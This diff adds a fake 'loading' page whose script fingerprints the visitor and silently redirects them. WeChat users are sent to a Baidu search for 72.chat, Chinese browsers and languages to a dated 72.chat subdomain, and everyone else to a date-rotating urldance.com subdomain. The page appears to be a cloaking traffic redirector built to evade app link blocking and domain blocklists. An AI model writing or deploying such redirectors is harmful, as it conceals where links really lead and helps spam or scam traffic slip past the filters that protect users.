@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="x-default">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>welcome</title>
+	<style>
+	.table-container {
+	display: table;
+	width: 100%;
+	height: 90vh;
+	}
+
+	.table-cell {
+	display: table-cell;
+	text-align: center;
+	vertical-align: middle;
+	}
+
+	.table-cell div {
+	width: 200px;
+	height: 100px;
+	}
+	</style>
+</head>
+<body style="background-image:url('');background-size: cover;background-color: #F001CB">
+<div class="table-container">
+    <div class="table-cell"><h2 style="color: white;">loading……</h2></div>
+</div>
+<script>
+(function() {
+    var ua = navigator.userAgent || '';
+
+    if (ua.indexOf('MicroMessenger') > -1) {
+        window.location.href = 'https://www.baidu.com/s?wd=www.72.chat';
+        return;
+    }
+
+    var CN_UA = ['UCBrowser','UCWEB','Quark','QuarkPC','BaiduBrowser','baidubrowser',
+                 'SogouMobileBrowser','Metasr','metaseeker','360SE','360EE','QihooBrowser',
+                 '360browser','HuaweiBrowser','HUAWEI','HBPC','MiuiBrowser','XiaoMi',
+                 'VivoBrowser','HeyTapBrowser','LBBROWSER','2345Explorer','Maxthon','TheWorld'];
+    var isCNBrowser = false;
+    for (var i = 0; i < CN_UA.length; i++) {
+        if (ua.indexOf(CN_UA[i]) > -1) { isCNBrowser = true; break; }
+    }
+
+    var firstLang = String((navigator.languages && navigator.languages[0]) || navigator.language || '').toLowerCase();
+    var isZh = firstLang.substring(0, 2) === 'zh';
+
+    var search = window.location.search;
+    var d = new Date();
+    var dateParam = d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0');
+
+    if (isCNBrowser || isZh) {
+        window.location.href = 'https://20260303.72.chat/three' + search;
+    } else {
+        window.location.href = 'https://' + dateParam + '.urldance.com/en' + search;
+    }
+})();
+</script>
+</body>
+</html>
